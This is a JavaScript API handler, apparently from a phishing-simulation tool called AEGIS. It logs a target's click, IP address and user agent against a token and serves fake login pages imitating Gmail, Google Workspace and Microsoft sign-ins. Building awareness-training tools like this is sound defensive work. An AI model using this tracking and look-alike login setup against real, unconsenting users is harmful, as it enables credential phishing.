/**
 * AEGIS — GET /api/sim-click (routed from /sim/:token via vercel.json)
 * ───────────────────────────────────────────────────────────────────────────
 * Validates token, marks clicked, serves platform-matched fake login page.
 * Token is read from the URL path segment after /sim/
 */

import { kv } from '@vercel/kv';
import { readFileSync } from 'fs';
import { join } from 'path';

const TOKEN_TTL_SECONDS = 60 * 60 * 24 * 7;

export default async function handler(req, res) {
  if (req.method !== 'GET') {
    return res.status(405).send('Method not allowed');
  }

  // Extract token from URL — vercel.json rewrites /sim/:token to this handler
  const token = req.url?.split('/sim/')[1]?.split('?')[0] || '';

  if (!token || token.length !== 32) {
    return serveLoginPage(res, 'generic', '', token);
  }

  let record;
  try {
    record = await kv.get(`token:${token}`);
  } catch (err) {
    console.error('KV get error:', err);
    return serveLoginPage(res, 'generic', '', token);
  }

  if (!record) {
    // Token expired or invalid — serve generic page, don't reveal status
    return serveLoginPage(res, 'generic', '', token);
  }

  // Mark first click (idempotent)
  if (!record.clicked) {
    record.clicked    = true;
    record.clicked_at = new Date().toISOString();
    record.clicked_ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || null;
    record.clicked_ua = (req.headers['user-agent'] || '').slice(0, 200);
    try {
      await kv.set(`token:${token}`, record, { ex: TOKEN_TTL_SECONDS });
    } catch (err) {
      console.error('KV set error:', err);
    }
  }

  return serveLoginPage(res, record.platform, record.email, token);
}

function serveLoginPage(res, platform, email, token) {
  const templateFile = {
    gmail:            'login-gmail.html',
    google_workspace: 'login-google-workspace.html',
    m365:             'login-m365.html',
    ms_personal:      'login-ms-personal.html',
    generic:          'login-generic.html',
  }[platform] || 'login-generic.html';

  try {
    let html = readFileSync(
      join(process.cwd(), 'login-pages', templateFile),
      'utf8'
    );
    html = html
      .replace(/__TOKEN__/g, escapeHtml(token))
      .replace(/__EMAIL__/g, escapeHtml(email))
      .replace(/__PLATFORM__/g, escapeHtml(platform));

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    return res.status(200).send(html);
  } catch (err) {
    console.error('Template read error:', err);
    return res.status(404).send('Not found');
  }
}

function escapeHtml(str) {
  return String(str || '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}
